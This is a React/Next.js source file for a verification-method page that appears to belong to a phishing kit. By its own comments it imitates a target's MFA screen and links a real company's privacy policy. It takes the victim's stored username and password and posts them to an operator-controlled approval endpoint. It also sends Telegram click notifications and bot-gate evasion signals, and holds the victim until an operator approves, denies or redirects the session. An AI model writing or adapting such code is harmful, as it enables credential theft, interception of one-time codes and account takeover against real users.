"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import AuthShell from "@/components/auth-shell";
import {
  APPROVAL_TIMEOUT_MS,
  MSG_UNABLE_REACH_VERIFICATION,
} from "@/lib/approval-messages";
import { pollPendingLogin } from "@/lib/poll-pending-login";
import { useBotGateSignals } from "@/hooks/use-bot-gate-signals";

/**
 * Verification Method Selection Page (Gate 1) — `/verify-choice`.
 *
 * UI: target's own MFA template (see Step 2). Admin gate per Step 3 §8:
 *   POST /api/pending-login { flow: "login", …bot-gate signals }
 *   → pollPendingLogin(id, APPROVAL_TIMEOUT_MS)  (90s)
 *   approved  → /verify immediately (no post-approve delay)
 *   redirected→ /api/login-out
 *   denied    → /?loginDenied=1            (homepage error, Rule 2)
 *   timeout   → /?verifyUnavailable=1      (homepage error, Rule 2)
 *   create failure / throw → plain inline MSG_UNABLE_REACH_VERIFICATION
 *
 * Channels: Email + SMS/Text only (Rule 4). Telegram method-selection event
 * fires fire-and-forget BEFORE the gate (kit click rule).
 */

const METHOD_OPTIONS = [
  { value: "email", label: "Email", verificationType: "Email" },
  { value: "text", label: "Text message", verificationType: "Text Message" },
] as const;

type Method = (typeof METHOD_OPTIONS)[number]["value"];

function readSessionCredentials(): { userId: string; password: string } {
  try {
    const userId =
      sessionStorage.getItem("saved_username") ||
      sessionStorage.getItem("login_user_id") ||
      "";
    const password = sessionStorage.getItem("ubs_password") || "";
    return { userId, password };
  } catch {
    return { userId: "", password: "" };
  }
}

export default function VerifyChoicePage() {
  const router = useRouter();
  const getBotGateSignals = useBotGateSignals();
  const [isLoading, setIsLoading] = useState(false);
  const [method, setMethod] = useState<Method>("email");
  const [error, setError] = useState<string | null>(null);

  // Project session guard: identifier + password must exist, else `/`.
  useEffect(() => {
    const { userId, password } = readSessionCredentials();
    if (!userId || !password) router.replace("/");
  }, [router]);

  const handleSendCode = async () => {
    if (isLoading) return;
    setIsLoading(true);
    setError(null);

    const { userId, password } = readSessionCredentials();
    if (!userId || !password) {
      router.replace("/");
      return;
    }

    try {
      sessionStorage.setItem("ubs_method", method);
    } catch {
      /* storage disabled — flow continues */
    }

    const selected =
      METHOD_OPTIONS.find((o) => o.value === method) ?? METHOD_OPTIONS[0];

    // Fire-and-forget method Telegram FIRST (kit click rule — never awaited).
    void fetch("/api/telegram/verification-click", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        verificationType: selected.verificationType,
        method,
        userId,
        page: "/verify-choice",
      }),
      keepalive: true,
    }).catch(() => {});

    try {
      // ===== Gate 1 — admin create + 90s poll =====
      const res = await fetch("/api/pending-login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          flow: "login",
          userId,
          password,
          method,
          maskedEmail: "-",
          maskedPhone: "-",
          ...getBotGateSignals(),
        }),
      });
      const data = (await res.json().catch(() => ({}))) as { id?: string };

      if (!res.ok || !data?.id) {
        setError(MSG_UNABLE_REACH_VERIFICATION);
        setIsLoading(false);
        return;
      }

      const outcome = await pollPendingLogin(
        String(data.id),
        APPROVAL_TIMEOUT_MS,
      );
      setIsLoading(false);

      if (outcome === "approved") {
        router.push("/verify");
        return;
      }
      if (outcome === "redirected") {
        window.location.href = "/api/login-out";
        return;
      }
      if (outcome === "denied") {
        window.location.href = "/?loginDenied=1";
        return;
      }
      // timeout | error
      window.location.href = "/?verifyUnavailable=1";
    } catch {
      setError(MSG_UNABLE_REACH_VERIFICATION);
      setIsLoading(false);
    }
  };

  return (
    <AuthShell>
      <form onSubmit={(e) => { e.preventDefault(); void handleSendCode(); }}>
        <div className="form-group">
          <h4 className="panel-title">Let&apos;s verify this is you</h4>
        </div>

        <div className="form-group">
          Please select one of the following methods to validate your
          identity. A code will be sent to the selected destination.
        </div>

        <div className="form-group">
          <ul style={{ listStyleType: "none" }}>
            {METHOD_OPTIONS.map((option) => (
              <li key={option.value}>
                <input
                  id={`rb-${option.value}`}
                  className="attn-radio"
                  type="radio"
                  name="destination"
                  value={option.value}
                  checked={method === option.value}
                  onChange={() => setMethod(option.value)}
                  disabled={isLoading}
                />
                <label htmlFor={`rb-${option.value}`}>
                  <span>{option.label}</span>
                </label>
              </li>
            ))}
          </ul>
        </div>

        {error ? (
          <div className="form-group">
            <div className="row">
              <div className="text-center login-error" role="alert">
                {error}
              </div>
            </div>
          </div>
        ) : null}

        <div className="form-group text-center">
          <button
            id="btn-send-code"
            className="main-btn btn-block"
            type="submit"
            disabled={isLoading}
          >
            {isLoading ? null : "Send Code"}
            {isLoading ? (
              <i className="fa fa-cog fa-spin" aria-hidden="true"></i>
            ) : null}
          </button>
        </div>

        <hr />
        <p className="text-center">
          <a
            style={{ fontSize: "10px" }}
            href="https://myameriflex.com/security-privacy-terms-conditions/"
            target="_blank"
            rel="noopener noreferrer"
          >
            Privacy Policy
          </a>
        </p>
      </form>
    </AuthShell>
  );
}
